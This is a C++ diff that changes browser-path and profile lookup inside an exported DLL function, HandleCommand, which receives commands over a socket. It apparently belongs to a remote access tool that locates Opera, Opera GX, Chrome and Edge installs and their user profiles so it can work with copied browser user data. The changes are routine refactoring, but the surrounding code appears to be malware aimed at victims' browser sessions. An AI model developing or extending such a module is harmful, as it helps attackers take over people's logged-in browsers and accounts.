@@ -1318,29 +1318,32 @@ static wstring get_app_path(const wstring& appName) {
     }
 
     if (appName == L"opera.exe" || appName == L"launcher.exe" || appName == L"operagx.exe") {
-        const wchar_t* subfolders[] = { L"Opera", L"Opera GX", L"Programs\\Opera", L"Programs\\Opera GX", L"Opera Software\\Opera Stable", L"Opera Software\\Opera GX Stable", L"Programs\\Opera GX Stable" };
-        const wchar_t* exes[] = { L"launcher.exe", L"opera.exe", L"operagx.exe" };
+        vector<wstring> subfolders;
+        vector<wstring> exes;
+
+        if (appName == L"operagx.exe") {
+            subfolders = { L"Opera GX", L"Programs\\Opera GX", L"Opera Software\\Opera GX Stable", L"Programs\\Opera GX Stable" };
+            exes = { L"operagx.exe", L"launcher.exe", L"opera.exe" };
+        } else {
+            subfolders = { L"Opera", L"Programs\\Opera", L"Opera Software\\Opera Stable" };
+            exes = { L"launcher.exe", L"opera.exe" };
+        }
+
         int folders[] = { CSIDL_LOCAL_APPDATA, CSIDL_APPDATA, CSIDL_PROGRAM_FILES, CSIDL_PROGRAM_FILESX86, CSIDL_PROFILE };
 
         for (auto folderId : folders) {
             if (SHGetFolderPathW(NULL, folderId, NULL, 0, szPath) == S_OK) {
                 wstring base = szPath;
                 if (!base.empty() && base.back() != L'\\') base += L'\\';
-                for (auto folder : subfolders) {
+                for (const auto& folder : subfolders) {
                     wstring f = folder;
                     if (!f.empty() && f.back() != L'\\') f += L'\\';
-                    for (auto exe : exes) {
+                    for (const auto& exe : exes) {
                         wstring check = base + f + exe;
                         if (file_exists(check)) return check;
                     }
                 }
             }
-        }
-
-        // Specific check for user-reported path pattern
-        if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath) == S_OK) {
-            wstring check = wstring(szPath) + L"\\Programs\\Opera GX\\opera.exe";
-            if (file_exists(check)) return check;
         }
 
         // Try environment variables directly as a last resort
@@ -1350,10 +1353,10 @@ static wstring get_app_path(const wstring& appName) {
             if (GetEnvironmentVariableW(env, envBuf, MAX_PATH) > 0) {
                 wstring base = envBuf;
                 if (!base.empty() && base.back() != L'\\') base += L'\\';
-                for (auto folder : subfolders) {
+                for (const auto& folder : subfolders) {
                     wstring f = folder;
                     if (!f.empty() && f.back() != L'\\') f += L'\\';
-                    for (auto exe : exes) {
+                    for (const auto& exe : exes) {
                         wstring check = base + f + exe;
                         if (file_exists(check)) return check;
                     }
@@ -1511,9 +1514,12 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
                     wstring exePath = get_app_path(exeName);
                     if (exePath.empty()) {
-                        // Exhaustive fallback loop for Opera variants
-                        const wchar_t* fallbackExes[] = { L"opera.exe", L"operagx.exe", L"launcher.exe" };
-                        for (auto fallback : fallbackExes) {
+                        // Variant-specific fallback loop for Opera variants
+                        vector<wstring> fallbackExes;
+                        if (wRequestedPath == L"Opera GX") fallbackExes = { L"operagx.exe", L"launcher.exe", L"opera.exe" };
+                        else if (wRequestedPath == L"Opera") fallbackExes = { L"opera.exe", L"launcher.exe" };
+
+                        for (auto& fallback : fallbackExes) {
                             exePath = get_app_path(fallback);
                             if (!exePath.empty()) break;
                         }
@@ -1550,7 +1556,6 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
                     // İlk profili tespit et (Default veya Profile 1)
                     wstring profileDir = L"Default";
-                    bool isOpera = (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX");
 
                     WIN32_FIND_DATAW findData;
                     HANDLE hFind = FindFirstFileW((sourceUserData + L"\\*").c_str(), &findData);
@@ -1559,13 +1564,13 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         do {
                             wstring name = findData.cFileName;
                             if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-                                if (isOpera) {
-                                    if (name == L"Opera Stable" || name == L"Opera GX Stable" || name == L"Default") {
-                                        profileDir = name;
-                                        foundProfile = true;
-                                        break;
-                                    }
-                                } else {
+                                if (wRequestedPath == L"Opera GX") {
+                                    if (name == L"Opera GX Stable") { profileDir = name; foundProfile = true; break; }
+                                } else if (wRequestedPath == L"Opera") {
+                                    if (name == L"Opera Stable") { profileDir = name; foundProfile = true; break; }
+                                }
+
+                                if (wRequestedPath == L"Google Chrome" || wRequestedPath == L"Microsoft Edge") {
                                     if (name == L"Default" || name.find(L"Profile ") == 0) {
                                         profileDir = name;
                                         foundProfile = true;
@@ -1576,7 +1581,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         } while (FindNextFileW(hFind, &findData));
                         FindClose(hFind);
                     }
-                    if (!foundProfile && isOpera) {
+                    if (!foundProfile && (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX")) {
                         profileDir = L"Default";
                     }
 
